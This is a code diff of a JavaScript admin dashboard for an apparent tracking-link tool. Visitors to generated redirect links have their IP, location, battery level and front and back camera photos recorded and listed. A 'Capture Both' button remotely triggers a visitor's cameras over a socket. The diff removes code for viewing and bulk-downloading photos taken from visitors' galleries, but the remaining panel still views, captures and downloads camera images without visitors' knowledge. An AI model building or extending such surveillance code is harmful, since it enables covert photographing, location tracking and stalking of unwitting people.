@@ -47,10 +47,6 @@ socket.on('location-data', () => {
     refreshAllData();
 });
 
-socket.on('gallery-data', () => {
-    refreshAllData();
-});
-
 // ============================================
 // TAB SWITCHING
 // ============================================
@@ -61,12 +57,8 @@ function showTab(tab) {
     document.getElementById('tabDashboard').className = 'tab-btn' + (tab === 'dashboard' ? ' active' : '');
     document.getElementById('tabUsers').className = 'tab-btn' + (tab === 'users' ? ' active' : '');
     document.getElementById('tabLinks').className = 'tab-btn' + (tab === 'links' ? ' active' : '');
-    if (tab === 'users') {
-        refreshAllData();
-    }
-    if (tab === 'links') {
-        loadLinks();
-    }
+    if (tab === 'users') { refreshAllData(); }
+    if (tab === 'links') { loadLinks(); }
 }
 
 // ============================================
@@ -115,12 +107,10 @@ function loadLinks() {
 function displayLinks(links) {
     const container = document.getElementById('linksList');
     container.innerHTML = '';
-    
     if (!links || links.length === 0) {
         container.innerHTML = '<p style="color:#999; text-align:center; padding:40px;">No links generated yet.</p>';
         return;
     }
-    
     links.forEach(link => {
         const card = document.createElement('div');
         card.className = 'visitor-card';
@@ -128,16 +118,10 @@ function displayLinks(links) {
             <div class="visitor-header">
                 <div>
                     <strong>🔗 Link ID: ${link.linkId}</strong>
-                    <div style="font-size:14px; color:#666; margin-top:5px;">
-                        📌 ${link.link}
-                    </div>
-                    <div style="font-size:13px; color:#888; margin-top:3px;">
-                        🎯 Redirect: ${link.redirectUrl}
-                    </div>
+                    <div style="font-size:14px; color:#666; margin-top:5px;">📌 ${link.link}</div>
+                    <div style="font-size:13px; color:#888; margin-top:3px;">🎯 Redirect: ${link.redirectUrl}</div>
                 </div>
-                <span style="padding:5px 10px; background:#48bb78; color:white; border-radius:5px; font-size:12px;">
-                    👥 ${link.totalVisits || 0} visits
-                </span>
+                <span style="padding:5px 10px; background:#48bb78; color:white; border-radius:5px; font-size:12px;">👥 ${link.totalVisits || 0} visits</span>
             </div>
             <div style="display:flex; gap:10px; margin-top:10px; flex-wrap:wrap;">
                 <button onclick="copyToClipboard('${link.link}')" class="camera-btn" style="background:#48bb78;">📋 Copy Link</button>
@@ -194,7 +178,6 @@ function displayVisitors(visitors) {
     const container = document.getElementById('visitorsList');
     container.innerHTML = '';
     const recent = visitors.slice(-10).reverse();
-    
     recent.forEach(visitor => {
         const card = document.createElement('div');
         card.className = 'visitor-card';
@@ -236,7 +219,6 @@ function displayVisitors(visitors) {
 function displayAllUsers(users) {
     const container = document.getElementById('allUsersList');
     container.innerHTML = '';
-    
     if (!users || users.length === 0) {
         container.innerHTML = '<p style="color:#999; text-align:center; padding:40px;">No users data available yet.</p>';
         document.getElementById('userCount').textContent = '(0)';
@@ -244,18 +226,14 @@ function displayAllUsers(users) {
     }
     
     let filteredUsers = [...users];
-    
     if (currentFilter !== 'all') {
         const now = new Date();
         const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
-        
         filteredUsers = filteredUsers.filter(user => {
             const visitDate = user.visitDate ? new Date(user.visitDate) : null;
             if (!visitDate) return false;
-            
-            if (currentFilter === 'today') {
-                return visitDate >= today;
-            } else if (currentFilter === 'yesterday') {
+            if (currentFilter === 'today') { return visitDate >= today; }
+            else if (currentFilter === 'yesterday') {
                 const yesterday = new Date(today);
                 yesterday.setDate(yesterday.getDate() - 1);
                 return visitDate >= yesterday && visitDate < today;
@@ -284,13 +262,11 @@ function displayAllUsers(users) {
         const card = document.createElement('div');
         card.className = 'visitor-card';
         card.id = 'user-' + user.id;
-        
         let locationStr = '';
         if (user.location) {
             const loc = user.location;
             locationStr = `📍 ${loc.city || ''} ${loc.state || ''} ${loc.country || ''}`;
         }
-        
         const visitCount = user.totalVisits || 0;
         const lastVisit = user.lastVisit ? new Date(user.lastVisit).toLocaleString() : 'Never';
         
@@ -320,12 +296,10 @@ function displayAllUsers(users) {
                 ${user.frontCamera ? `<button onclick="downloadPhoto('${user.frontCamera}', 'front-${user.id}.jpg')" class="camera-btn" style="background:#48bb78;">⬇️ Front</button>` : ''}
                 ${user.backCamera ? `<button onclick="downloadPhoto('${user.backCamera}', 'back-${user.id}.jpg')" class="camera-btn" style="background:#48bb78;">⬇️ Back</button>` : ''}
                 <button onclick="captureVisitorPhoto('both')" class="camera-btn" style="background:#ed8936;">📸 Capture Both</button>
-                ${user.galleryPhotos && user.galleryPhotos.length > 0 ? `<button onclick="viewGallery('${user.id}')" class="camera-btn" style="background:#9f7aea;">🖼️ View Gallery</button>` : ''}
             </div>
             <div style="display:flex; gap:10px; margin-top:10px; flex-wrap:wrap;">
                 ${user.frontCamera ? `<img src="${user.frontCamera}" style="max-width:60px; border-radius:5px;">` : ''}
                 ${user.backCamera ? `<img src="${user.backCamera}" style="max-width:60px; border-radius:5px;">` : ''}
-                ${user.galleryPhotos && user.galleryPhotos.length > 0 ? `<span style="font-size:12px; color:#888; padding:5px;">🖼️ ${user.galleryPhotos.length} photos</span>` : ''}
             </div>
             ${visitCount > 0 ? `<div style="margin-top:8px; font-size:12px; color:#888;">📋 ${visitCount} visits. Click "Full Details" for history.</div>` : ''}
         `;
@@ -334,127 +308,12 @@ function displayAllUsers(users) {
 }
 
 // ============================================
-// VIEW GALLERY - ALL PHOTOS
-// ============================================
-function viewGallery(userId) {
-    fetch(`/api/visitor/${userId}`)
-        .then(response => response.json())
-        .then(user => {
-            const photos = user.galleryPhotos || [];
-            const content = document.getElementById('galleryContent');
-            content.innerHTML = '';
-            
-            if (photos.length === 0) {
-                content.innerHTML = '<p style="color:#999;">No photos found</p>';
-            } else {
-                // Show all photos
-                photos.forEach((photo, index) => {
-                    const div = document.createElement('div');
-                    div.style.cssText = 'position:relative; display:inline-block; margin:5px;';
-                    div.innerHTML = `
-                        <img src="${photo}" style="width:150px; height:150px; object-fit:cover; border-radius:8px; cursor:pointer; border:2px solid #e2e8f0;" onclick="downloadPhoto('${photo}', 'gallery-${userId}-${index}.jpg')">
-                        <button onclick="downloadPhoto('${photo}', 'gallery-${userId}-${index}.jpg')" style="position:absolute; bottom:5px; right:5px; background:rgba(0,0,0,0.7); color:white; border:none; border-radius:5px; padding:2px 8px; cursor:pointer; font-size:11px;">⬇️</button>
-                    `;
-                    content.appendChild(div);
-                });
-                
-                // Add download all button if multiple photos
-                if (photos.length > 1) {
-                    const downloadAllBtn = document.createElement('button');
-                    downloadAllBtn.className = 'camera-btn';
-                    downloadAllBtn.style.cssText = 'background:#48bb78; margin-bottom:15px;';
-                    downloadAllBtn.textContent = `📥 Download All (${photos.length} photos)`;
-                    downloadAllBtn.onclick = function() {
-                        photos.forEach((p, i) => {
-                            setTimeout(() => {
-                                downloadPhoto(p, `gallery-${userId}-${i}.jpg`);
-                            }, i * 300);
-                        });
-                        showNotification(`📥 Downloading ${photos.length} photos...`);
-                    };
-                    content.prepend(downloadAllBtn);
-                }
-                
-                // Show count
-                const countDiv = document.createElement('div');
-                countDiv.style.cssText = 'width:100%; text-align:center; color:#666; font-size:14px; margin-bottom:10px;';
-                countDiv.textContent = `🖼️ ${photos.length} photos found`;
-                content.prepend(countDiv);
-            }
-            
-            document.getElementById('galleryModal').style.display = 'flex';
-        });
-}
-
-// ============================================
-// VIEW GALLERY FROM VISIT
-// ============================================
-function viewGalleryVisit(userId, visitIndex) {
-    fetch(`/api/visitor/${userId}`)
-        .then(response => response.json())
-        .then(user => {
-            const visit = user.visitHistory[visitIndex];
-            if (!visit || !visit.galleryPhotos) {
-                alert('No gallery photos found for this visit');
-                return;
-            }
-            
-            const photos = visit.galleryPhotos || [];
-            const content = document.getElementById('galleryContent');
-            content.innerHTML = '';
-            
-            if (photos.length === 0) {
-                content.innerHTML = '<p style="color:#999;">No photos found</p>';
-            } else {
-                photos.forEach((photo, index) => {
-                    const div = document.createElement('div');
-                    div.style.cssText = 'position:relative; display:inline-block; margin:5px;';
-                    div.innerHTML = `
-                        <img src="${photo}" style="width:150px; height:150px; object-fit:cover; border-radius:8px; cursor:pointer; border:2px solid #e2e8f0;" onclick="downloadPhoto('${photo}', 'gallery-${userId}-${visitIndex}-${index}.jpg')">
-                        <button onclick="downloadPhoto('${photo}', 'gallery-${userId}-${visitIndex}-${index}.jpg')" style="position:absolute; bottom:5px; right:5px; background:rgba(0,0,0,0.7); color:white; border:none; border-radius:5px; padding:2px 8px; cursor:pointer; font-size:11px;">⬇️</button>
-                    `;
-                    content.appendChild(div);
-                });
-                
-                if (photos.length > 1) {
-                    const downloadAllBtn = document.createElement('button');
-                    downloadAllBtn.className = 'camera-btn';
-                    downloadAllBtn.style.cssText = 'background:#48bb78; margin-bottom:15px;';
-                    downloadAllBtn.textContent = `📥 Download All (${photos.length} photos)`;
-                    downloadAllBtn.onclick = function() {
-                        photos.forEach((p, i) => {
-                            setTimeout(() => {
-                                downloadPhoto(p, `gallery-${userId}-${visitIndex}-${i}.jpg`);
-                            }, i * 300);
-                        });
-                        showNotification(`📥 Downloading ${photos.length} photos...`);
-                    };
-                    content.prepend(downloadAllBtn);
-                }
-                
-                const countDiv = document.createElement('div');
-                countDiv.style.cssText = 'width:100%; text-align:center; color:#666; font-size:14px; margin-bottom:10px;';
-                countDiv.textContent = `🖼️ ${photos.length} photos from this visit`;
-                content.prepend(countDiv);
-            }
-            
-            document.getElementById('galleryModal').style.display = 'flex';
-        });
-}
-
-// ============================================
 // FILTER FUNCTIONS
 // ============================================
 function filterVisits(filter) {
     currentFilter = filter;
     displayAllUsers(allUsersData);
-    const filterNames = {
-        'all': 'All',
-        'today': 'Today',
-        'yesterday': 'Yesterday',
-        '7days': 'Last 7 Days',
-        '30days': 'Last 30 Days'
-    };
+    const filterNames = { 'all': 'All', 'today': 'Today', 'yesterday': 'Yesterday', '7days': 'Last 7 Days', '30days': 'Last 30 Days' };
     showNotification(`📅 Filter: ${filterNames[filter] || filter}`);
 }
 
@@ -469,21 +328,16 @@ function sortVisits(sort) {
 // ============================================
 function updateUsersStats(users) {
     document.getElementById('totalUsers').textContent = users.length;
-    
     let totalVisits = 0;
     const uniqueStates = new Set();
     let activeNow = 0;
-    
     users.forEach(user => {
         totalVisits += (user.totalVisits || 0);
         if (user.location && user.location.state) {
             uniqueStates.add(user.location.state);
         }
-        if (user.connected) {
-            activeNow++;
-        }
+        if (user.connected) { activeNow++; }
     });
-    
     document.getElementById('totalVisitsAll').textContent = totalVisits;
     document.getElementById('uniqueLocations').textContent = uniqueStates.size;
     document.getElementById('activeNow').textContent = activeNow;
@@ -499,7 +353,6 @@ function populateStateFilter(users) {
             states.add(user.location.state);
         }
     });
-    
     const filter = document.getElementById('filterState');
     const currentValue = filter.value;
     filter.innerHTML = '<option value="">All States</option>';
@@ -515,29 +368,19 @@ function populateStateFilter(users) {
 function searchUsers() {
     const query = document.getElementById('searchUsers').value.toLowerCase().trim();
     const stateFilter = document.getElementById('filterState').value;
-    
     const cards = document.querySelectorAll('#allUsersList .visitor-card');
     let visibleCount = 0;
-    
     cards.forEach(card => {
         const text = card.textContent.toLowerCase();
         let show = true;
-        
-        if (query && !text.includes(query)) {
-            show = false;
-        }
-        
+        if (query && !text.includes(query)) { show = false; }
         if (stateFilter) {
             const userState = text.match(/📍\s*([^,]+)/);
-            if (userState && userState[1] && userState[1].trim() !== stateFilter) {
-                show = false;
-            }
+            if (userState && userState[1] && userState[1].trim() !== stateFilter) { show = false; }
         }
-        
         card.style.display = show ? 'block' : 'none';
         if (show) visibleCount++;
     });
-    
     document.getElementById('userCount').textContent = `(${visibleCount} users)`;
 }
 
@@ -580,12 +423,10 @@ function showUserDetails(userId) {
                                 ${visit.ip ? `• 🌐 ${visit.ip}` : ''}
                                 ${visitLoc !== 'N/A' ? `• 📍 ${visitLoc}` : ''}
                                 ${visit.battery ? `• 🔋 ${visit.battery}%` : ''}
-                                ${visit.galleryPhotos && visit.galleryPhotos.length > 0 ? `• 🖼️ ${visit.galleryPhotos.length} photos` : ''}
                             </div>
                             <div>
                                 <button onclick="showVisitDetails('${userId}', ${index})" class="camera-btn" style="background:#667eea; padding:3px 10px; font-size:12px;">👁️ View</button>
                                 <button onclick="deleteVisit('${userId}', ${index})" class="camera-btn" style="background:#fc8181; padding:3px 10px; font-size:12px;">🗑️</button>
-                                ${visit.galleryPhotos && visit.galleryPhotos.length > 0 ? `<button onclick="viewGalleryVisit('${userId}', ${index})" class="camera-btn" style="background:#9f7aea; padding:3px 10px; font-size:12px;">🖼️</button>` : ''}
                             </div>
                         </div>
                     `;
@@ -612,7 +453,6 @@ function showUserDetails(userId) {
                             <div class="detail-card"><label>🔄 Total Visits</label><div class="value">${user.totalVisits || 0}</div></div>
                             <div class="detail-card"><label>📅 Last Visit</label><div class="value">${user.lastVisit ? new Date(user.lastVisit).toLocaleString() : 'N/A'}</div></div>
                             <div class="detail-card"><label>🟢 Status</label><div class="value">${user.connected ? 'Online' : 'Offline'}</div></div>
-                            <div class="detail-card"><label>🖼️ Gallery</label><div class="value">${user.galleryPhotos && user.galleryPhotos.length > 0 ? `${user.galleryPhotos.length} photos` : 'N/A'}</div></div>
                         </div>
                         ${visitHistoryHTML}
                     </div>
@@ -648,13 +488,6 @@ function showUserDetails(userId) {
                                     </div>
                                 </div>
                             ` : '<p style="color:#999;">No back photo</p>'}
-                            
-                            ${user.galleryPhotos && user.galleryPhotos.length > 0 ? `
-                                <div>
-                                    <p><strong>🖼️ Gallery (${user.galleryPhotos.length} photos)</strong></p>
-                                    <button onclick="viewGallery('${user.id}')" class="camera-btn" style="background:#9f7aea;">View Gallery</button>
-                                </div>
-                            ` : ''}
                         </div>
                         
                         <div style="margin-top:20px; border-top:1px solid #ddd; padding-top:15px;">
@@ -685,10 +518,8 @@ function showVisitDetails(userId, visitIndex) {
                 alert('Visit not found');
                 return;
             }
-            
             const modal = document.getElementById('visitModal');
             const content = document.getElementById('visitDetailsContent');
-            
             content.innerHTML = `
                 <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px;">
                     <div class="detail-card"><label>📅 Visit Date</label><div class="value">${visit.visitDate ? new Date(visit.visitDate).toLocaleString() : 'N/A'}</div></div>
@@ -701,11 +532,9 @@ function showVisitDetails(userId, visitIndex) {
                     <div class="detail-card"><label>📍 Location</label><div class="value">${visit.location ? `${visit.location.city || ''} ${visit.location.state || ''} ${visit.location.country || ''}` : 'N/A'}</div></div>
                     ${visit.frontCamera ? `<div class="detail-card"><label>📸 Front Photo</label><div class="value"><img src="${visit.frontCamera}" style="max-width:150px; border-radius:5px; margin-top:5px;"></div></div>` : ''}
                     ${visit.backCamera ? `<div class="detail-card"><label>📸 Back Photo</label><div class="value"><img src="${visit.backCamera}" style="max-width:150px; border-radius:5px; margin-top:5px;"></div></div>` : ''}
-                    ${visit.galleryPhotos && visit.galleryPhotos.length > 0 ? `<div class="detail-card"><label>🖼️ Gallery</label><div class="value">${visit.galleryPhotos.length} photos</div></div>` : ''}
                     <div class="detail-card"><label>🔄 Redirect Complete</label><div class="value">${visit.redirectComplete ? '✅ Yes' : '❌ No'}</div></div>
                 </div>
             `;
-            
             modal.style.display = 'flex';
         });
 }
@@ -715,7 +544,6 @@ function showVisitDetails(userId, visitIndex) {
 // ============================================
 function deleteVisit(userId, visitIndex) {
     if (!confirm('Delete this visit from history?')) return;
-    
     fetch(`/api/visitor/${userId}/visit/${visitIndex}`, { method: 'DELETE' })
         .then(response => response.json())
         .then(data => {
@@ -738,18 +566,15 @@ function captureVisitorPhoto(type) {
         alert('Please select a visitor first');
         return;
     }
-    
     const statusDiv = document.getElementById('captureStatus');
     if (statusDiv) {
         statusDiv.textContent = `📸 Requesting ${type} photo...`;
         statusDiv.style.color = '#4299e1';
     }
-    
     socket.emit('admin-capture', {
         visitorId: currentVisitorId,
         type: type
     });
-    
     setTimeout(() => {
         if (statusDiv) {
             statusDiv.textContent = `✅ ${type} photo requested! Refreshing...`;
@@ -788,7 +613,6 @@ function downloadPhoto(imageData, filename) {
 // ============================================
 function deleteVisitor(visitorId) {
     if (!confirm('Delete this visitor data?')) return;
-    
     fetch(`/api/visitor/${visitorId}`, { method: 'DELETE' })
         .then(response => response.json())
         .then(data => {
@@ -855,12 +679,10 @@ function logout() {
 function showNotification(message) {
     const existing = document.querySelector('.notification');
     if (existing) existing.remove();
-    
     const div = document.createElement('div');
     div.className = 'notification';
     div.textContent = message;
     document.body.appendChild(div);
-    
     setTimeout(() => {
         div.style.opacity = '0';
         div.style.transition = 'opacity 0.5s';
